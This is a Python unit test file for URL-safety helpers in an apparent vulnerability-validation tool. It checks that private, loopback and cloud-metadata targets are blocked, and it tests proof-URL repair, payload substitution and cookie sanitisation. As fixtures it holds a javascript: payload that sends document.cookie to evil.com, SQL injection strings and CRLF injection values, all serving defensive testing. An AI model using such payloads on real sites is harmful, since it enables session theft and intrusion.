"""
Unit tests for the H1 URL-safety helpers extracted from the validator god module.

These are pure and deterministic: the safety gate that refuses private/loopback
targets, the proof-URL repair for copy/paste breakage, safe-variant substitution
and cookie sanitisation.
"""

from __future__ import annotations

from dast.hackerone.url_safety import (
    is_safe_url,
    repair_proof_url,
    sanitise_cookies,
    substitute_payload_in_url,
)


class TestIsSafeUrl:
    def test_public_https_allowed(self):
        assert is_safe_url("https://example.com/x") is True

    def test_public_hostname_http_allowed(self):
        assert is_safe_url("http://target.acme-corp.com/?q=1") is True

    def test_empty_rejected(self):
        assert is_safe_url("") is False

    def test_non_http_scheme_rejected(self):
        assert is_safe_url("javascript:alert(1)") is False
        assert is_safe_url("file:///etc/passwd") is False

    def test_loopback_ip_rejected(self):
        assert is_safe_url("http://127.0.0.1/x") is False

    def test_private_ip_rejected(self):
        assert is_safe_url("http://10.1.2.3/") is False
        assert is_safe_url("http://192.168.0.1/") is False

    def test_aws_metadata_rejected(self):
        assert is_safe_url("http://169.254.169.254/latest/meta-data/") is False

    def test_localhost_rejected(self):
        assert is_safe_url("http://localhost:8080/") is False

    def test_internal_suffix_rejected(self):
        assert is_safe_url("http://svc.internal/") is False
        assert is_safe_url("http://metadata.google.internal/") is False

    def test_malformed_url_rejected(self):
        assert is_safe_url("http://") is False


class TestRepairProofUrl:
    def test_bare_plus_in_js_payload_reencoded(self):
        url = "http://t.com/?url=javascript:top['loca'+'tion']='https://evil.com'+document.cookie"
        assert "'loca'%2b'tion'" in repair_proof_url(url)

    def test_plus_outside_js_payload_untouched(self):
        url = "http://t.com/search?q=a+b&x=1"
        assert repair_proof_url(url) == url

    def test_html_entity_ampersand_decoded(self):
        assert repair_proof_url("http://t.com/?a=1&amp;b=2") == "http://t.com/?a=1&b=2"

    def test_next_param_after_js_payload_preserved(self):
        out = repair_proof_url("http://t.com/?url=javascript:x='a'+'b'&filename=y")
        assert "&filename=y" in out and "'a'%2b'b'" in out

    def test_empty_unchanged(self):
        assert repair_proof_url("") == ""


class TestSubstitutePayloadInUrl:
    def test_raw_payload_replaced_with_encoded_safe_variant(self):
        out = substitute_payload_in_url("http://t.com/?q=DROP TABLE", "DROP TABLE", "1' AND '1'='1")
        assert "DROP TABLE" not in out
        assert "%27" in out  # safe variant is percent-encoded

    def test_encoded_form_of_payload_replaced(self):
        url = "http://t.com/?q=DROP%20TABLE"
        out = substitute_payload_in_url(url, "DROP TABLE", "safe")
        assert out == "http://t.com/?q=safe"

    def test_missing_payload_returns_url_unchanged(self):
        url = "http://t.com/?q=other"
        assert substitute_payload_in_url(url, "DROP TABLE", "safe") == url

    def test_empty_safe_variant_returns_unchanged(self):
        url = "http://t.com/?q=x"
        assert substitute_payload_in_url(url, "x", "") == url


class TestSanitiseCookies:
    def test_strips_crlf_from_keys_and_values(self):
        out = sanitise_cookies({"na\r\nme": "va\nlue"})
        assert out == {"name": "value"}

    def test_drops_empty_key(self):
        assert sanitise_cookies({"\r\n": "v"}) == {}

    def test_truncates_long_values(self):
        out = sanitise_cookies({"k": "a" * 5000})
        assert len(out["k"]) == 4096

    def test_none_input_yields_empty(self):
        assert sanitise_cookies(None) == {}
